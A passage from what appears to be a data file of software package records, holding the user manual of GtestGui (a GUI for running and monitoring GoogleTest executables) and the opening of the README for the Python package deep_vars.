  When more than one CPU is configured, this option can be used for scheduling different sets of test cases on different CPUs: The first set of CPUs runs only test cases matching the test case filter. The second set of CPUs runs all test cases. The size of the second set is determined by the given number.

  This feature is useful when running a long test campaign after modifying a test case as it allows effectively increasing the repetition count of the modified test case. It is also useful when running test cases that aim to find race conditions, as the additional concurrent execution of all test cases serves to generate a background load that increases randomness of thread scheduling.

*Fail limit*:
  When set to a non-zero value, the test campaign is stopped after the given number of failed test cases was reached. Note for the limit the total of failures is counted across all test cases and all CPUs.

  This option is **not** using the respective Gtest option, as that option would not work as expected when using multiple CPUs (as it would work independently for tests on each CPU). Instead, the handling is implemented in result handling in GtestGui. As there is a delay resulting from buffering in the pipeline between test application and GtestGui, more test cases may have failed in the mean time, so that the actual number of failures after the actual end of all test processes may be higher than the limit.

*Clean traces of passed tests*:
  When enabled, trace output of passed test case runs is not written to the trace output file. If all test cases of a test campaign passed, the complete output file is removed automatically when tests are stopped. This feature is intended for long test campaigns to reduce consumption of disk space.

*Clean core files*:
  When enabled, core files with pattern ""\ ``core.PID``"" are deleted automatically after a test case crashed. (See chapter `Result log`_ for more details on core files.) Note GtestGui can only clean core files from processes it controls directly. It is not able to clean core dumps created by death tests that are child processes of the main test process.

*Shuffle execution order*:
  When enabled, ""\ ``--gtest_shuffle``"" option is set via the executable's command line. This option randomizes the order of test execution.

*Run disabled tests*:
  When enabled, ""\ ``--gtest_also_run_disabled_tests``"" option is set via the executable's command line. The option enables execution of test suites and individual test cases whose name starts with ""\ ``DISABLED``"".

  The option also affects test case filter and test case selection menus within GtestGui: When the option is not set, entering filter pattern ""\ ``*DISABLED*``"" would raise a warning that it matches no test cases (even if there are some with that name). The drop-down menu below the entry field would no show such names.

*Break on failure*:
  When enabled, ""\ ``--gtest_break_on_failure``"" option is set via the executable's command line. This will cause SIGTRAP to be sent to the test process upon the first failure. As no debugger is attached, this will cause the process to crash.

  When core dumps are enabled in the kernel, the core will be saved by GtestGui and can be analyzed via the *Extract stack trace from core dump* command in the result log's context menu. When core dumps are not enabled, this option is probably not useful.

*Break on exception*:
  When enabled, ""\ ``--gtest_catch_exceptions=0``"" option is set via the executable's command line. This will disable catching of exceptions by the Gtest framework, which means any exception not caught by the test case itself causes the test process to crash due to an unhandled exception.

  When core dumps are enabled in the kernel, the core will be saved by GtestGui and can be analyzed via the *Extract stack trace from core dump* command in the result log's context menu. When core dumps are not enabled, this option is probably not useful.

*Valgrind* and *Valgrind - 2nd option set*:
  The two valgrind options serve to run each execution of the test executable under valgrind using the configured command line. Notably, valgrind checks are performed across the complete lifetime of the test process, thus spanning all test cases or test repetitions. Therefore, if for example a memory leak is reported at the end, it cannot be determined which test case caused it (or it may even be caused by interaction of the test sequence.) Therefore valgrind errors are reported with a special entry in the result log. Some kind of errors such as invalid memory accesses can be mapped to test cases based on the position of the error report in the output stream. Note however that the position may not exactly reflect the timing of occurrence due to possible buffering in output streams within the test executable.) See `Result log`_ and `Configuration`_ for more details.

Result log
----------

The result log frame is located in the middle of the main window. When started for the first time, the log is usually empty. However, results can also be imported via the command line, for example from a file that contains output from a test executable that was redirected into a file. The result log may also show results from a previous run of GtestGui, if auto-import is enabled in `Configuration`_.

The result log contains one line for each ``[ OK ]``, ``[ SKIPPED ]`` and ``[ FAILED ]`` line in the test application's gtest-generated output. The test executable's output stream is redirected to a pipe that is read continuously by GtestGui for this purpose. GtestGui also stores this output to a file, so that the trace output between ``[ RUN ]`` and verdict text line can be opened in a trace browser.

In addition to the standard verdicts generated by the gtest library, GtestGui supports verdict ``[ CRASHED ]``, which is appended to the trace file when an executable terminates with a non-zero exit code within a test case.

When running tests under **valgrind**, a special result log entry ""Valgrind error"" is added if valgrind's exit code signals detection of an error. This case is special, as it's not known which test case caused the error, if more than one was running. Double-clicking this entry will therefore open the complete trace file.

Each entry in the result log contains the following information:

-   Local time at which the result was captured.

-   Verdict: Passed, failed, skipped, crashed, or special case valgrind of startup errors.

-   Test case name.

-   ""Seed"" value parsed from trace output, if a regular expression was configured for that purpose in `Configuration`_.

-   Test duration as reported by gtest (in milliseconds).

-   In case of failure, source code file and line where of the first ""Failure"" was reported in trace output.

-   Timestamp or name of executable that generated the test output, in case the executable has changed since running the test.

When selecting an entry by clicking on it, the corresponding trace output is shown in the trace preview frame below the result log. In case of a test case failure, the view is centered on the first line containing ""Failure"" and the text is marked by light red background.

When clicking on an entry with the right mouse button, a context menu opens that allow opening the trace file, adding or removing the selected test case from the filter option, scheduling a test for repetition, excluding a result from the log display, or removing results.

Additional commands are offered in the ""Result log"" drop-down of the main window menu. The commands allow sorting and filtering the result log by various criteria.

On UNIX platform, the context menu additionally supports extracting a thread overview and stack-trace (backtrace) of each thread from a core dump in case of a crash during execution of a test case. To allow this, ``/proc/sys/kernel/core_pattern`` needs to be configured as ""\ ``core.%p``"", or alternatively as ""\ ``core``"", when additionally ``/proc/sys/kernel/core_uses_pid`` is set to ""1"". If GtestGui thus finds a file named ""core.PID"" with PID matching that of the test executable process after a process crashed, it will automatically preserve that core file for analysis by renaming it and moving it into the directory where trace text output files are stored. It will also preserve the executable file version by keeping a hard link to the same executable.

Configuration
-------------

User-interface options
~~~~~~~~~~~~~~~~~~~~~~

A few simple options for the user interface are available directly in the *Configure* menu:

*Select font for result log*:
  Selects the font used in the result log list in the main window, as well as in the test case list and job list dialogs. By default, the font is determined by Python's Tkinter and depends on the platform.

*Select font for trace preview*:
  Selects the font used in the trace preview frame at the bottom of the main window. By default, a fixed font is used; Font family and size are determined by Python's Tkinter and depend on the platform.

*Show test controls*:
  This option can be unchecked for temporarily hiding the test control frame in the main window. This allows for more space for the result log during result analysis. This option is not stored in persistent configuration and will always be enabled upon start of the application. Note while the controls are not shown, some operations are still possible via key bindings as well as the *Control* menu.

*Show tool-tip popups*:
  The option can be unchecked to disable display of ""tool-tip"" popup windows when hovering with the mouse on labels or check-buttons in the main window and dialogs which have such built-in help. Changes of the option are stored in the configuration file, so that it is persistent. This may be useful once you are sufficiently familiar with the tool.

Test management options
~~~~~~~~~~~~~~~~~~~~~~~

*Trace browser*
  This entry field selects the external application used for displaying trace files and trace snippets, when double-clicking on an entry in the result log. By default, trace browser *trowser.py* is used. You can either specify just the application file name, or its full path if it is not found via ``PATH`` configured in environment. The path of the trace file to be displayed will be appended to the given command line.

  Currently the application path name or parameters cannot contain space characters, as these are assumed to be separators.

  Note for the Windows platform: When using the default of ``trowser.py``, you may need to insert the Python interpreter in front of ""trowser.py"", depending on your Python installation. In that case you need to add the full path to where ``trowser.py`` is installed.

  Enable option *Browser supports reading from STDIN* if the selected trace browser supports reading text from ""standard input"" via a pipeline. In this case filename ""\ ``-``"" is passed on the command line instead of a file name.  The default browser *trowser.py* supports this. When not enabled, GtestGui has to create temporary files for passing trace snippets to the browser application.

*Pattern for seed*
  If a regular expression pattern is specified here, it will be applied to the trace of each test case. The string returned by the first match group (i.e. the first set of capturing parenthesis) will be shown in the corresponding result log as ""seed"". (This is intended for allowing repeat of a test sequence exactly even for test cases using randomness, by starting their PRNG with the same seed. This is not yet supported however, due to lack of an interface for passing a list of seed values via the GTest command line interface.)

*Directory for trace files*
  Specifies the directory where to store temporary files for trace output and core dump files collected from the executable under test. If empty, the current working directory at the time of starting GtestGui is used. Note sub-directories will be created in the given directory for each executable file version. If you want to use the ""copy executable"" option, the specified directory needs to be in the same filesystem as the executables. If you want to keep core dumps, the directory needs to be in the same filesystem as the working directory (because they will be moved, not copied due to size.)

*Automatically remove trace files of passed tests upon exit*
  When enabled, output from passed test cases is automatically removed from created trace files upon exiting the application. Trace files and sub-directories only containing passed test results are thus removed entirely. Note imported trace files are never modified or removed automatically, so you may need to remove these manually once after enabling this option (e.g. via result log context menu).

*Automatically import trace files upon start*
  When enabled, all trace files found in sub-directories under the configured trace directory are read after starting GtestGui. Test case results found in the files are shown in the result log window.

*Create copy of executable under test*
  When enabled, a copy of the current executable under test is made within the configured trace directory. (Technically, the copy is achieved by creating a so-called ""hard link"", so that no additional disk space is needed.) This is recommended so that recompiling the executable does not affect the current test run (i.e. compilation may either fail with error ""file busy"" when tests are running, or tests may crash). This option is required for allowing to extract stack traces from core dump files taken from an older executable version. Note this option may not work when using trace directories in locations such as /tmp on UNIX-like systems, as these usually are configured to disallow executable files for security reasons.

*Valgrind command line*
  *UNIX only:* Command lines to use for running test executables when one of the ""Valgrind"" options in the main window is enabled. The executable name and gtest options will be appended to the given command line.

  There are two separate entry fields, corresponding to the two check-buttons in the main window. This is intended for allowing to configure a configuration variant that runs faster and one that is slower but performs deeper analysis. By default, the command will perform check for memory leaks (notably at end of all test cases, not for individual test cases in a run of multiple tests) and for use of uninitialized memory. The second command line has additional options for tracking the origin of uninitialized memory.

  Currently the path or parameters cannot contain space characters, as these are assumed to be separators.

*Valgrind supports --exit-code*
  When this option is set, parameter ""--error-exitcode=125"" will be appended to the given valgrind command lines. This is required for detecting automatically that valgrind found errors during test execution. Only when enabled, result logs will report valgrind errors.

The debugger used for extracting stack traces from core files (POSIX only) is currently not configurable; It is hard-coded to ""\ ``gdb``"", which should be somewhere in the ``PATH`` configured in environment.

Caveats
-------

This chapter lists notable limitations that are not easy to overcome due to design choices.

Concurrent scheduling
  Concurrent scheduling requested via option *CPUs* is based on the ""sharding"" feature provided by Gtest framework. Unfortunately, Gtest only supports static case test partitioning, which means for example when using two CPUs, the set of test cases is split in two parts, of which the first is executed in one test process and the second in the second process.

  One problem arises when the number of test cases is smaller than the number of CPUs. This typically occurs, when trying to run a single test case many times. Sharding would then only use a single CPU, as it does not consider repetitions in its ""sharding"" algorithm. GtestGui works around that by calculating if it is more efficient to partition test cases by repetition than by sharding, or if a combination of both is even better. In the mentioned example, it would not use sharding, but instead run half the number of repetitions in one process, and the second half in the second. For more complex configurations such as 10 repetitions of 9 test cases on 8 CPUs, a combination of both methods will be used.

  A second problem that GtestGui cannot work around occurs when test cases have non-uniform execution time. As the ""sharding"" algorithm uses static partitioning solely based on the number of test cases per process, differences in execution times are not considered. For example, when two tests are scheduled for 100 times and test case A takes 1 second, but test case B only 1 millisecond, Gtest will still schedule all runs of A in the first process and all runs of B in the second process. Thus, the second process will sit idle for 99.9% of the total test execution time.

Test case crashes
  In a well-behaved test application, failures are normally reported via Gtest macros or exceptions. Thus, the failure is recorded and the next test case is executed. Sometimes however, a test case may have a bug that leads to a crash of the complete process. In this case all following test cases or test case repetitions are no longer executed.

  Currently GtestGui will not attempt to restart tests after a crash, because it expects that the same test case will crash again and thus keep blocking following tests. It is not possible to disable the instable test, as this would interfere with partitioning by Gtest ""sharding"", i.e. the set of test cases run by that test case would be altered. The only way around is for the use to manually disable the instable test case and then restart the test campaign.

Overload of GUI by concurrent unit-testing
  When using multiple CPUs for running very short-running test cases, such as typical unit-tests, the GUI application may be overloaded and thus appear unresponsive and hung. This is a result of Python's implementation of multi-threading, which does not allow using more than one effective CPU due to exclusive locks in interpreter execution. Therefore, when parsing of test output streams takes 100% of a CPU, no time is left for updating the GUI even though separate threads are used.

For more minor constraints and ideas for enhancements see file ``TODO.txt``, which is part of the package.

Files
-----

**$HOME/.config/gtest_gui/gtest_gui.rc**
  This file stores parameters that are configured via the `Configuration`_ dialog. Additional it contains persistent state such as the list of previously loaded executable files and the size and position of resizable dialog windows.

**trace.NNNN/trace.NNNN**
  Output from test applications is stored to sub-directories files called ""\ ``trace.``"" with a number appended. The number is an arbitrary identifier for the test executable whose output they contain. The directory contains a separate output file for each spawned test process.  Files in this directory are removed when removing results in the `Result log`_ of the GUI. By default, traces containing only passed test case results are also cleaned upon exiting the GUI.

  By default, the sub-directories are created in the current working directory where GtestGui is started. Another base directory may be specified in `Configuration`_.

  If multiple instances of the GUI are started, they will use the same directory for storage. For single-user systems this works well enough, as conflicts may occur only when pressing ""Run"" button concurrently in different instances. For multi-user setup it is not recommended to share the directory. (Seeing other user's test results would be confusing anyway.)

**TEMP/gtest_gui_tmpXXX**
  A temporary directory at the default place used by the operating system for such purpose will be created, for for example for unpacking trace snippets for display, or exporting trace files to archives. A different directory is used by each instance of GtestGui. The directory is removed automatically when the GUI is closed. Note the latter may fail on some platforms if a trace browser application still has opened an exported trace file at the time of quitting the GUI.




","Module-Tester's Gtest GUI
=========================

Description
-----------

**Module-tester's GtestGui** is a full-featured graphical user-interface to C++ test applications using the GoogleTest framework.

The tool will work with any application with Gtest command line interface, however it is designed especially for C++ developers using test-driven design based on module testing and integration testing. These differ from unit-testing by longer execution times and usually not fully predictable results, which in turn require multiple repetitions of each test case. To support this well, GtestGui offers firstly easily accessible ways for test case filtering and concurrent scheduling across multiple CPUs; Secondly, there are multiple features for tracking progress and managing results via sorting and filtering, which are fully usable already while a test campaign still is in progress.

GtestGui typically is started with the path of an executable on the command line which is built using the gtest library. Using the ""Run"" button in the GUI, this executable can then be started and its progress be monitored live in the result log frame of the main window. Additional controls allow specifying options such as test case filter string and repetition count, which are forwarded to the executable via the respective ""\ ``--gtest_*``"" command line arguments.

While tests are running, test verdicts can be monitored live in the result log. Traces of passed or failed tests can already be analyzed simply by double-clicking on an entry in the result log, which will open the trace of that particular test case run. For this purpose GtestGui comes bundled with *Trowser*, which is a graphical browser for large line-oriented text files. Trowser in principle is just a text browser with syntax highlighting and search, but its search capabilities are designed especially to facilitate analysis of complex debug logs, essentially by allowing to build a condensed (filtered) view of the trace file in the search result window via incremental searches and manual manipulations. By default, GtestGui is configured to user *trowser.py*, but there is also a more modern-looking Qt5 variant. GtestGui can also be configured to use any other GUI application for opening traces.

Test control
------------

The application main window consists of a menu bar, a frame containing test controls, a frame containing the test result log, and a text frame for trace preview. This chapter describes the top-most frame with the test controls.

Test campaign control buttons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Most prominent in the test control frame are the green buttons, which directly control execution of the configured executable file:

*Run*:
  Starts the text executable in a separate process, with its output redirected into a pipe which is read by GtestGui for progress monitoring. The output is also saved into a file.

  Note when the timestamp of the executable file on disk has changed, GtestGui automatically reads the test case list to check for changes. An error will be reported if the current test case filter contains pattern that no longer match any test case. Note after adding a new test case, use the *Refresh test case list* command in the *Control* menu to read the test case list, for allowing to use the new test case name in a filter pattern.

  Multiple processes are started if the *CPUs* value is larger than 1. Most of the time, GtestGui will use gtest's ""sharding"" feature, which assigns a static sub-set of tests to each process. However, if repetition count is larger than one and the number of configured CPUs is larger than the number of test cases, or if the remainder of division of test cases by CPUs is large, GtestGui may instead or additionally partition by repetitions.

  Note when a test process crashes, it is currently not restarted. That is because gtest's static sharding does not allow disabling the instable test case without influencing test case partitioning.

*Stop*:
  Sends a TERM signal to the test processes and waits for them to finish. When termination takes a long time (possibly because the executable is hung) and the button is clicked a second time, a KILL signal is sent.

*Resume*:
  Restarts test case execution using the same test case filter setting and executable version as previously used, without resetting the test result statistics. Other options, such as repetition or CPU count may be modified. This operation is useful when a long test run has to be paused temporarily as the CPUs are needed otherwise, or for changing options such as the number of used CPUs.

  This command will also use the same version of the test executable as used previously if option *Create copy of executable file* is enabled, see `Configuration`_. This allows resuming execution even when the executable at the configured path no longer exists, for example due to a failed build.

  When resuming, scheduling cannot restart exactly where it was stopped due to limitations in gtest. If repetition count is 1, all test cases will be rescheduled. For higher repetition count, the lowest number of remaining repetitions across all selected test cases is rescheduled.

*Repeat*:
  Repeats the test cases marked manually for repetition via the result log, or all previously failed test cases if none were selected. This allows quick repetition of individual test cases without changing the test case filter.

Test case filter
~~~~~~~~~~~~~~~~

The entry field at the top of the test control frame allows specifying a test case filter, so that only a matching sub-set of test cases is run. The filter can be entered manually using the same syntax as the ""\ ``--gtest-filter``"" command line option: The format of a filter expression is a "":""-separated list of test case names of wildcard patterns (positive patterns), optionally followed by a ""-"" and another "":""-separated pattern list (negative patterns). A test matches the filter if and only if it matches any of the positive patterns, but none of the negative ones. Wildcard characters are ""*"" (matching any sub-string) and ""?"" (matching any single character). As a special case, when no positive pattern is specified, all test cases are considered matching.

Alternatively, the test case filter can be modified via the drop-down menu below the entry field (which can be opened by the Cursor-Down key or a click on the drop-down button next to the entry field). The menu has entries for selecting and deselecting entries test suites as well as individual test cases. When modifying the filter this way, GtestGui will update the entry field with the shortest filter expression it can find using trailing wild card and negative patterns.

Yet another alternative for modifying test case filters is the test case list dialog, either via its context menu or the ""Return"" and ""Delete"" key bindings. Finally note any modification to the test case filter can be undone using ""Control-Z"" key binding in the entry field, or redone using ""Control-Y"" key binding.

Test control options
~~~~~~~~~~~~~~~~~~~~

*Repetitions*:
  If a value larger than 1 is entered here, it is passed via the ""\ ``--gtest_repeat=NNN``"" option on the executable's command line. This causes each test case to be repeated the given number of times.

*CPUs*:
  This option is described in `Test campaign control buttons`_.

*Ignore filter*:
  When more than one CPU is configured, this option can be used for scheduling different sets of test cases on different CPUs: The first set of CPUs runs only test cases matching the test case filter. The second set of CPUs runs all test cases. The size of the second set is determined by the given number.

  This feature is useful when running a long test campaign after modifying a test case as it allows effectively increasing the repetition count of the modified test case. It is also useful when running test cases that aim to find race conditions, as the additional concurrent execution of all test cases serves to generate a background load that increases randomness of thread scheduling.

*Fail limit*:
  When set to a non-zero value, the test campaign is stopped after the given number of failed test cases was reached. Note for the limit the total of failures is counted across all test cases and all CPUs.

  This option is **not** using the respective Gtest option, as that option would not work as expected when using multiple CPUs (as it would work independently for tests on each CPU). Instead, the handling is implemented in result handling in GtestGui. As there is a delay resulting from buffering in the pipeline between test application and GtestGui, more test cases may have failed in the mean time, so that the actual number of failures after the actual end of all test processes may be higher than the limit.

*Clean traces of passed tests*:
  When enabled, trace output of passed test case runs is not written to the trace output file. If all test cases of a test campaign passed, the complete output file is removed automatically when tests are stopped. This feature is intended for long test campaigns to reduce consumption of disk space.

*Clean core files*:
  When enabled, core files with pattern ""\ ``core.PID``"" are deleted automatically after a test case crashed. (See chapter `Result log`_ for more details on core files.) Note GtestGui can only clean core files from processes it controls directly. It is not able to clean core dumps created by death tests that are child processes of the main test process.

*Shuffle execution order*:
  When enabled, ""\ ``--gtest_shuffle``"" option is set via the executable's command line. This option randomizes the order of test execution.

*Run disabled tests*:
  When enabled, ""\ ``--gtest_also_run_disabled_tests``"" option is set via the executable's command line. The option enables execution of test suites and individual test cases whose name starts with ""\ ``DISABLED``"".

  The option also affects test case filter and test case selection menus within GtestGui: When the option is not set, entering filter pattern ""\ ``*DISABLED*``"" would raise a warning that it matches no test cases (even if there are some with that name). The drop-down menu below the entry field would no show such names.

*Break on failure*:
  When enabled, ""\ ``--gtest_break_on_failure``"" option is set via the executable's command line. This will cause SIGTRAP to be sent to the test process upon the first failure. As no debugger is attached, this will cause the process to crash.

  When core dumps are enabled in the kernel, the core will be saved by GtestGui and can be analyzed via the *Extract stack trace from core dump* command in the result log's context menu. When core dumps are not enabled, this option is probably not useful.

*Break on exception*:
  When enabled, ""\ ``--gtest_catch_exceptions=0``"" option is set via the executable's command line. This will disable catching of exceptions by the Gtest framework, which means any exception not caught by the test case itself causes the test process to crash due to an unhandled exception.

  When core dumps are enabled in the kernel, the core will be saved by GtestGui and can be analyzed via the *Extract stack trace from core dump* command in the result log's context menu. When core dumps are not enabled, this option is probably not useful.

*Valgrind* and *Valgrind - 2nd option set*:
  The two valgrind options serve to run each execution of the test executable under valgrind using the configured command line. Notably, valgrind checks are performed across the complete lifetime of the test process, thus spanning all test cases or test repetitions. Therefore, if for example a memory leak is reported at the end, it cannot be determined which test case caused it (or it may even be caused by interaction of the test sequence.) Therefore valgrind errors are reported with a special entry in the result log. Some kind of errors such as invalid memory accesses can be mapped to test cases based on the position of the error report in the output stream. Note however that the position may not exactly reflect the timing of occurrence due to possible buffering in output streams within the test executable.) See `Result log`_ and `Configuration`_ for more details.

Result log
----------

The result log frame is located in the middle of the main window. When started for the first time, the log is usually empty. However, results can also be imported via the command line, for example from a file that contains output from a test executable that was redirected into a file. The result log may also show results from a previous run of GtestGui, if auto-import is enabled in `Configuration`_.

The result log contains one line for each ``[ OK ]``, ``[ SKIPPED ]`` and ``[ FAILED ]`` line in the test application's gtest-generated output. The test executable's output stream is redirected to a pipe that is read continuously by GtestGui for this purpose. GtestGui also stores this output to a file, so that the trace output between ``[ RUN ]`` and verdict text line can be opened in a trace browser.

In addition to the standard verdicts generated by the gtest library, GtestGui supports verdict ``[ CRASHED ]``, which is appended to the trace file when an executable terminates with a non-zero exit code within a test case.

When running tests under **valgrind**, a special result log entry ""Valgrind error"" is added if valgrind's exit code signals detection of an error. This case is special, as it's not known which test case caused the error, if more than one was running. Double-clicking this entry will therefore open the complete trace file.

Each entry in the result log contains the following information:

-   Local time at which the result was captured.

-   Verdict: Passed, failed, skipped, crashed, or special case valgrind of startup errors.

-   Test case name.

-   ""Seed"" value parsed from trace output, if a regular expression was configured for that purpose in `Configuration`_.

-   Test duration as reported by gtest (in milliseconds).

-   In case of failure, source code file and line where of the first ""Failure"" was reported in trace output.

-   Timestamp or name of executable that generated the test output, in case the executable has changed since running the test.

When selecting an entry by clicking on it, the corresponding trace output is shown in the trace preview frame below the result log. In case of a test case failure, the view is centered on the first line containing ""Failure"" and the text is marked by light red background.

When clicking on an entry with the right mouse button, a context menu opens that allow opening the trace file, adding or removing the selected test case from the filter option, scheduling a test for repetition, excluding a result from the log display, or removing results.

Additional commands are offered in the ""Result log"" drop-down of the main window menu. The commands allow sorting and filtering the result log by various criteria.

On UNIX platform, the context menu additionally supports extracting a thread overview and stack-trace (backtrace) of each thread from a core dump in case of a crash during execution of a test case. To allow this, ``/proc/sys/kernel/core_pattern`` needs to be configured as ""\ ``core.%p``"", or alternatively as ""\ ``core``"", when additionally ``/proc/sys/kernel/core_uses_pid`` is set to ""1"". If GtestGui thus finds a file named ""core.PID"" with PID matching that of the test executable process after a process crashed, it will automatically preserve that core file for analysis by renaming it and moving it into the directory where trace text output files are stored. It will also preserve the executable file version by keeping a hard link to the same executable.

Configuration
-------------

User-interface options
~~~~~~~~~~~~~~~~~~~~~~

A few simple options for the user interface are available directly in the *Configure* menu:

*Select font for result log*:
  Selects the font used in the result log list in the main window, as well as in the test case list and job list dialogs. By default, the font is determined by Python's Tkinter and depends on the platform.

*Select font for trace preview*:
  Selects the font used in the trace preview frame at the bottom of the main window. By default, a fixed font is used; Font family and size are determined by Python's Tkinter and depend on the platform.

*Show test controls*:
  This option can be unchecked for temporarily hiding the test control frame in the main window. This allows for more space for the result log during result analysis. This option is not stored in persistent configuration and will always be enabled upon start of the application. Note while the controls are not shown, some operations are still possible via key bindings as well as the *Control* menu.

*Show tool-tip popups*:
  The option can be unchecked to disable display of ""tool-tip"" popup windows when hovering with the mouse on labels or check-buttons in the main window and dialogs which have such built-in help. Changes of the option are stored in the configuration file, so that it is persistent. This may be useful once you are sufficiently familiar with the tool.

Test management options
~~~~~~~~~~~~~~~~~~~~~~~

*Trace browser*
  This entry field selects the external application used for displaying trace files and trace snippets, when double-clicking on an entry in the result log. By default, trace browser *trowser.py* is used. You can either specify just the application file name, or its full path if it is not found via ``PATH`` configured in environment. The path of the trace file to be displayed will be appended to the given command line.

  Currently the application path name or parameters cannot contain space characters, as these are assumed to be separators.

  Note for the Windows platform: When using the default of ``trowser.py``, you may need to insert the Python interpreter in front of ""trowser.py"", depending on your Python installation. In that case you need to add the full path to where ``trowser.py`` is installed.

  Enable option *Browser supports reading from STDIN* if the selected trace browser supports reading text from ""standard input"" via a pipeline. In this case filename ""\ ``-``"" is passed on the command line instead of a file name.  The default browser *trowser.py* supports this. When not enabled, GtestGui has to create temporary files for passing trace snippets to the browser application.

*Pattern for seed*
  If a regular expression pattern is specified here, it will be applied to the trace of each test case. The string returned by the first match group (i.e. the first set of capturing parenthesis) will be shown in the corresponding result log as ""seed"". (This is intended for allowing repeat of a test sequence exactly even for test cases using randomness, by starting their PRNG with the same seed. This is not yet supported however, due to lack of an interface for passing a list of seed values via the GTest command line interface.)

*Directory for trace files*
  Specifies the directory where to store temporary files for trace output and core dump files collected from the executable under test. If empty, the current working directory at the time of starting GtestGui is used. Note sub-directories will be created in the given directory for each executable file version. If you want to use the ""copy executable"" option, the specified directory needs to be in the same filesystem as the executables. If you want to keep core dumps, the directory needs to be in the same filesystem as the working directory (because they will be moved, not copied due to size.)

*Automatically remove trace files of passed tests upon exit*
  When enabled, output from passed test cases is automatically removed from created trace files upon exiting the application. Trace files and sub-directories only containing passed test results are thus removed entirely. Note imported trace files are never modified or removed automatically, so you may need to remove these manually once after enabling this option (e.g. via result log context menu).

*Automatically import trace files upon start*
  When enabled, all trace files found in sub-directories under the configured trace directory are read after starting GtestGui. Test case results found in the files are shown in the result log window.

*Create copy of executable under test*
  When enabled, a copy of the current executable under test is made within the configured trace directory. (Technically, the copy is achieved by creating a so-called ""hard link"", so that no additional disk space is needed.) This is recommended so that recompiling the executable does not affect the current test run (i.e. compilation may either fail with error ""file busy"" when tests are running, or tests may crash). This option is required for allowing to extract stack traces from core dump files taken from an older executable version. Note this option may not work when using trace directories in locations such as /tmp on UNIX-like systems, as these usually are configured to disallow executable files for security reasons.

*Valgrind command line*
  *UNIX only:* Command lines to use for running test executables when one of the ""Valgrind"" options in the main window is enabled. The executable name and gtest options will be appended to the given command line.

  There are two separate entry fields, corresponding to the two check-buttons in the main window. This is intended for allowing to configure a configuration variant that runs faster and one that is slower but performs deeper analysis. By default, the command will perform check for memory leaks (notably at end of all test cases, not for individual test cases in a run of multiple tests) and for use of uninitialized memory. The second command line has additional options for tracking the origin of uninitialized memory.

  Currently the path or parameters cannot contain space characters, as these are assumed to be separators.

*Valgrind supports --exit-code*
  When this option is set, parameter ""--error-exitcode=125"" will be appended to the given valgrind command lines. This is required for detecting automatically that valgrind found errors during test execution. Only when enabled, result logs will report valgrind errors.

The debugger used for extracting stack traces from core files (POSIX only) is currently not configurable; It is hard-coded to ""\ ``gdb``"", which should be somewhere in the ``PATH`` configured in environment.

Caveats
-------

This chapter lists notable limitations that are not easy to overcome due to design choices.

Concurrent scheduling
  Concurrent scheduling requested via option *CPUs* is based on the ""sharding"" feature provided by Gtest framework. Unfortunately, Gtest only supports static case test partitioning, which means for example when using two CPUs, the set of test cases is split in two parts, of which the first is executed in one test process and the second in the second process.

  One problem arises when the number of test cases is smaller than the number of CPUs. This typically occurs, when trying to run a single test case many times. Sharding would then only use a single CPU, as it does not consider repetitions in its ""sharding"" algorithm. GtestGui works around that by calculating if it is more efficient to partition test cases by repetition than by sharding, or if a combination of both is even better. In the mentioned example, it would not use sharding, but instead run half the number of repetitions in one process, and the second half in the second. For more complex configurations such as 10 repetitions of 9 test cases on 8 CPUs, a combination of both methods will be used.

  A second problem that GtestGui cannot work around occurs when test cases have non-uniform execution time. As the ""sharding"" algorithm uses static partitioning solely based on the number of test cases per process, differences in execution times are not considered. For example, when two tests are scheduled for 100 times and test case A takes 1 second, but test case B only 1 millisecond, Gtest will still schedule all runs of A in the first process and all runs of B in the second process. Thus, the second process will sit idle for 99.9% of the total test execution time.

Test case crashes
  In a well-behaved test application, failures are normally reported via Gtest macros or exceptions. Thus, the failure is recorded and the next test case is executed. Sometimes however, a test case may have a bug that leads to a crash of the complete process. In this case all following test cases or test case repetitions are no longer executed.

  Currently GtestGui will not attempt to restart tests after a crash, because it expects that the same test case will crash again and thus keep blocking following tests. It is not possible to disable the instable test, as this would interfere with partitioning by Gtest ""sharding"", i.e. the set of test cases run by that test case would be altered. The only way around is for the use to manually disable the instable test case and then restart the test campaign.

Overload of GUI by concurrent unit-testing
  When using multiple CPUs for running very short-running test cases, such as typical unit-tests, the GUI application may be overloaded and thus appear unresponsive and hung. This is a result of Python's implementation of multi-threading, which does not allow using more than one effective CPU due to exclusive locks in interpreter execution. Therefore, when parsing of test output streams takes 100% of a CPU, no time is left for updating the GUI even though separate threads are used.

For more minor constraints and ideas for enhancements see file ``TODO.txt``, which is part of the package.

Files
-----

**$HOME/.config/gtest_gui/gtest_gui.rc**
  This file stores parameters that are configured via the `Configuration`_ dialog. Additional it contains persistent state such as the list of previously loaded executable files and the size and position of resizable dialog windows.

**trace.NNNN/trace.NNNN**
  Output from test applications is stored to sub-directories files called ""\ ``trace.``"" with a number appended. The number is an arbitrary identifier for the test executable whose output they contain. The directory contains a separate output file for each spawned test process.  Files in this directory are removed when removing results in the `Result log`_ of the GUI. By default, traces containing only passed test case results are also cleaned upon exiting the GUI.

  By default, the sub-directories are created in the current working directory where GtestGui is started. Another base directory may be specified in `Configuration`_.

  If multiple instances of the GUI are started, they will use the same directory for storage. For single-user systems this works well enough, as conflicts may occur only when pressing ""Run"" button concurrently in different instances. For multi-user setup it is not recommended to share the directory. (Seeing other user's test results would be confusing anyway.)

**TEMP/gtest_gui_tmpXXX**
  A temporary directory at the default place used by the operating system for such purpose will be created, for for example for unpacking trace snippets for display, or exporting trace files to archives. A different directory is used by each instance of GtestGui. The directory is removed automatically when the GUI is closed. Note the latter may fail on some platforms if a trace browser application still has opened an exported trace file at the time of quitting the GUI.




",tomzox/gtest_gui
deep-vars,https://github.com/vsego/deep-vars,0,6860,6849,"# `deep_vars`

A package providing `deep_vars` function that serves a purpose similar to `vars`, but it works with any object and can recursively process attributes as well.

## Content

1. [Basic use](#basic-use)
2. [Configuration](#configuration)
    1. [Handlers](#handlers)
    2. [Further configuration specific to some handlers](#further-configuration-specific-to-some-handlers)
    3. [Extending handlers](#extending-handlers)

## Basic use

This is used in a way similar to `vars`. For example, the following code:

```python
from dataclasses import dataclass
from typing import Optional

from deep_vars import deep_vars


@dataclass
class Foo:
    x: int
    y: Optional[""Foo""] = None


foo = Foo(17, y=Foo(19))
print(""vars:                     "", vars(foo))
print(""deep_vars:                "", deep_vars(foo))
print(""deep_vars with maxdepth=2:"", deep_vars(foo, 2))
```

will print this:

```
vars:                      {'x': 17, 'y': Foo(x=19, y=None)}
